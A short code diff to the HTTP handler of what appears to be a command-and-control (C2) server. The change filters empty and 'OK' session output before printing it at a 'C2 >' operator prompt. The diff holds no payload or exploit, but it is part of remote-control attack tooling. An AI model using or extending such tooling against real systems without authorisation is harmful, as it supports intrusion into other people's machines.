@@ -82,8 +82,10 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 http_sessions[uid]["output"] = decoded_output
                 http_sessions[uid]["last_seen"] = time.time()
                 if current_session == ('http', uid):
-                    sys.stdout.write(f"\r{decoded_output.strip()}\nC2 > ")
-                    sys.stdout.flush()
+                    clean = decoded_output.strip()
+                    if clean and clean != "OK":
+                        sys.stdout.write(f"\r{clean}\nC2 > ")
+                        sys.stdout.flush()
 
         self._set_headers()
         self.wfile.write(b"OK")
